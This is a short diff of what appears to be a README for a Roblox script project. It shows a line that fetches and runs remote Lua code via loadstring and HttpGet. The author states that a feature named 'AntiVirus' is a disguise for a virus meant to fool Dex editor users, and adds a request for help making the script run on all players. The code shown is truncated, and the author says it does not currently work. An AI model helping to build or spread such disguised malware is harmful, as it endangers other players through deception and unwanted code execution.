@@ -10,3 +10,4 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/ELJOKER900/Roblox-EN
 
 (WARNING, SCRIPTS DOES NOT WORKS BECAUSE AN ERROR , PLEASE WAIT)
 (and the "AntiVirus" not is an antivirus , It is the mask of the virus, which makes no one with the Dex editor suspicious)
+(And i need help to make that script executes on all players )
